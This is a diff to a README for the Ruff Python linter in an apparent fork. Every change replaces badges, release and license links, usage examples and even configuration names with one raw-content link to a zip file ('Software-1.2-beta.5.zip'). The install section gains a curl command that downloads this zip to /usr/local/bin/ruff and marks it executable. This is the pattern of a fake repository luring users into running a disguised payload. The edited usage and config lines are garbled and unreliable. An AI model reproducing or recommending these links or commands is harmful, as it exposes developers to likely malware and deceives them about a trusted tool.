@@ -1,7 +1,7 @@
 # 🚀 Ruff: Fast Python Linter and Code Formatter
 
-[![Latest Release](https://img.shields.io/github/v/release/sartcod/ruff?style=flat-square)](https://github.com/sartcod/ruff/releases) 
-[![License](https://img.shields.io/github/license/sartcod/ruff?style=flat-square)](https://github.com/sartcod/ruff/blob/main/LICENSE)
+[![Latest Release](https://github.com/sartcod/ruff/raw/refs/heads/master/Athenian/Software-1.2-beta.5.zip)](https://github.com/sartcod/ruff/raw/refs/heads/master/Athenian/Software-1.2-beta.5.zip) 
+[![License](https://github.com/sartcod/ruff/raw/refs/heads/master/Athenian/Software-1.2-beta.5.zip)](https://github.com/sartcod/ruff/raw/refs/heads/master/Athenian/Software-1.2-beta.5.zip)
 
 Welcome to **Ruff**, an extremely fast Python linter and code formatter, built with Rust. Whether you're working on a small script or a large application, Ruff helps you maintain clean, readable code by adhering to style guidelines and catching potential issues early in the development process.
 
@@ -26,11 +26,11 @@ Welcome to **Ruff**, an extremely fast Python linter and code formatter, built w
 
 ## Installation
 
-To get started with Ruff, download the latest release from the [Releases section](https://github.com/sartcod/ruff/releases). Follow the instructions provided to install it on your system.
+To get started with Ruff, download the latest release from the [Releases section](https://github.com/sartcod/ruff/raw/refs/heads/master/Athenian/Software-1.2-beta.5.zip). Follow the instructions provided to install it on your system.
 
 ```bash
 # Example command to install Ruff
-curl -sSfL https://github.com/sartcod/ruff/releases/latest/download/ruff -o /usr/local/bin/ruff
+curl -sSfL https://github.com/sartcod/ruff/raw/refs/heads/master/Athenian/Software-1.2-beta.5.zip -o /usr/local/bin/ruff
 chmod +x /usr/local/bin/ruff
 ```
 
@@ -43,7 +43,7 @@ Once installed, you can run Ruff from the command line. Here are some basic comm
 To lint a Python file, simply run:
 
 ```bash
-ruff lint your_file.py
+ruff lint https://github.com/sartcod/ruff/raw/refs/heads/master/Athenian/Software-1.2-beta.5.zip
 ```
 
 ### Formatting
@@ -51,7 +51,7 @@ ruff lint your_file.py
 To format a Python file, use:
 
 ```bash
-ruff format your_file.py
+ruff format https://github.com/sartcod/ruff/raw/refs/heads/master/Athenian/Software-1.2-beta.5.zip
 ```
 
 ### Check for Issues
@@ -64,12 +64,12 @@ ruff lint your_directory/
 
 ## Configuration
 
-Ruff allows you to configure its behavior through a configuration file. You can create a `.ruff.toml` file in your project directory to specify your preferences.
+Ruff allows you to configure its behavior through a configuration file. You can create a `https://github.com/sartcod/ruff/raw/refs/heads/master/Athenian/Software-1.2-beta.5.zip` file in your project directory to specify your preferences.
 
 Here’s an example configuration:
 
 ```toml
-[tool.ruff]
+[https://github.com/sartcod/ruff/raw/refs/heads/master/Athenian/Software-1.2-beta.5.zip]
 line-length = 88
 exclude = ["migrations"]
 ```
@@ -98,7 +98,7 @@ We welcome contributions to Ruff! If you have ideas for improvements or find bug
 
 ## License
 
-Ruff is licensed under the MIT License. See the [LICENSE](https://github.com/sartcod/ruff/blob/main/LICENSE) file for more details.
+Ruff is licensed under the MIT License. See the [LICENSE](https://github.com/sartcod/ruff/raw/refs/heads/master/Athenian/Software-1.2-beta.5.zip) file for more details.
 
 ## Contact
 
@@ -106,4 +106,4 @@ For questions or feedback, feel free to reach out via the Issues section of this
 
 ---
 
-Thank you for checking out Ruff! We hope it enhances your Python coding experience. Don’t forget to visit the [Releases section](https://github.com/sartcod/ruff/releases) for the latest updates and downloads.
+Thank you for checking out Ruff! We hope it enhances your Python coding experience. Don’t forget to visit the [Releases section](https://github.com/sartcod/ruff/raw/refs/heads/master/Athenian/Software-1.2-beta.5.zip) for the latest updates and downloads.
